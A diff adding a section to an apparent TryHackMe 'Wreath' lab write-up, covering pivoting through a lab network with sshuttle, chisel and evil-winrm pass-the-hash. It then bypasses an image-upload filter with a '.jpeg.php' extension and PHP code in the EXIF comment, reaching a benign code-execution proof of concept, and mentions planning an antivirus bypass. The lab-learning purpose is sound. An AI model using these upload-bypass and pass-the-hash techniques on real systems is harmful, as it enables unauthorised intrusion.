@@ -2647,3 +2647,149 @@ $target = "uploads/".basename($_FILES["file"]["name"]);
 ```
 
 </details>
+
+## 24. Personal PC - Exploit PoC
+
+<details>
+  <summary>---</summary>
+
+What we know
+- We probably need creds
+- We can upload image files
+- There are two filters to stop uploading non image files
+- Both filters can be bypassed
+
+We know there is a `/resources` directory
+```
+kali@kali:~/thm/wreath/gitserver/Website/1-345ac8b236064b431fa43f53d91c98c4834ef8f3$ ls
+commit-meta.txt  css  favicon.png  fonts  img  index.html  js  resources
+```
+
+To access the personal website again we need to set up chisel
+
+Attacking machine sshuttle tunnel through webserver .200 to gitserver .150
+```
+kali@kali:~/thm/wreath$ sshuttle -r root@10.200.85.200 --ssh-cmd "ssh -i ssh/webserver_id_rsa" 10.200.85.0/24 -x 10.200.85.200
+[local sudo] Password: 
+c : Connected to server.
+```
+
+Attacking machine chisel client
+```
+kali@kali:~/thm/wreath$ chisel client 10.200.85.150:34999 9090:socks
+2021/04/23 09:11:32 client: Connecting to ws://10.200.85.150:34999
+2021/04/23 09:11:32 client: tun: proxy#127.0.0.1:9090=>socks: Listening
+2021/04/23 09:12:17 client: Connection error: dial tcp 10.200.85.150:34999: i/o timeout
+2021/04/23 09:12:17 client: Retrying in 100ms...
+2021/04/23 09:13:02 client: Connection error: dial tcp 10.200.85.150:34999: i/o timeout (Attempt: 1)
+2021/04/23 09:13:02 client: Retrying in 200ms...
+2021/04/23 09:13:36 client: Connected (Latency 280.663103ms)
+```
+
+evil-winrm into gitserver and start chisel server
+```
+kali@kali:~/thm/wreath$ evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.85.150
+
+Evil-WinRM shell v2.4
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> c:\windows\tmp\chisel-Neozer0.exe server -p 34999 --socks5
+chisel-Neozer0.exe : 2021/04/23 14:13:18 server: Fingerprint Ft4a8p6iIo7CNEF3v94jGufjy/gngH9Ym8/xlC8Fta0=
+    + CategoryInfo          : NotSpecified: (2021/04/23 14:1...H9Ym8/xlC8Fta0=:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+2021/04/23 14:13:18 server: Listening on http://0.0.0.0:349992021/04/23 14:13:35 server: session#1: Client version (0.0.0-src) differs from server version (1.7.6)
+```
+
+Finally we can visit `http://10.200.85.100/resources` where we are greeted with a login prompt
+
+![login prompt](./resources.png)
+
+Try Thomas' hash that we cracked earlier
+
+User: Thomas
+Password: i<3ruby
+
+.. And we're in
+
+Upload a normal jpg file and access it through `/resources/uploads/FILE.jpg`
+
+Upload success
+![upload success](./uploadsuccess.png)
+
+And we see our image
+![upload access](./uploadaccess.png)
+
+Now to upload an exploit to get webshell. We need to bypass the two filters
+1. The file extension can be bypassed with `.jpeg.php`
+2. The image size will require an actual image with shell injected in the exifdata, specifically the `Comment` field
+   
+Take a regular image and rename it with `.jpeg.php` extension
+
+Run `exiftool` on the image
+```
+kali@kali:~/thm/wreath$ exiftool test-Neozer0.jpeg.php 
+ExifTool Version Number         : 12.16
+File Name                       : test-Neozer0.jpeg.php
+Directory                       : .
+File Size                       : 45 KiB
+File Modification Date/Time     : 2021:04:23 09:30:57-04:00
+File Access Date/Time           : 2021:04:23 09:30:57-04:00
+File Inode Change Date/Time     : 2021:04:23 09:30:57-04:00
+File Permissions                : rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : None
+X Resolution                    : 1
+Y Resolution                    : 1
+Image Width                     : 750
+Image Height                    : 750
+Encoding Process                : Progressive DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 750x750
+Megapixels                      : 0.562
+```
+
+There is also AV installed on this target. It may detect any default PHP webshell uploaded and alert the victim. The first step then is to create a proof of concept before we can work out an AV bypass.
+
+Harmess PHP payload - `<?php echo "<pre>Test Payload</pre>"; die();?>` 
+
+We add this to the image with exiftool
+```
+kali@kali:~/thm/wreath$ exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" test-Neozer0.jpeg.php
+    1 image files updated
+kali@kali:~/thm/wreath$ exiftool test-Neozer0.jpeg.php ExifTool Version Number         : 12.16
+File Name                       : test-Neozer0.jpeg.php
+Directory                       : .
+File Size                       : 45 KiB
+File Modification Date/Time     : 2021:04:23 09:35:37-04:00
+File Access Date/Time           : 2021:04:23 09:35:37-04:00
+File Inode Change Date/Time     : 2021:04:23 09:35:37-04:00
+File Permissions                : rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : None
+X Resolution                    : 1
+Y Resolution                    : 1
+Comment                         : <?php echo "<pre>Test Payload</pre>"; die(); ?>
+Image Width                     : 750
+Image Height                    : 750
+Encoding Process                : Progressive DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 750x750
+Megapixels                      : 0.562
+```
+
+Now we upload this benign payload and access it on the browser to see that the test payload has worked and we are able to execute PHP code on the system!
+
+![upload poc](./uploadpoc.png)
+
+</details>
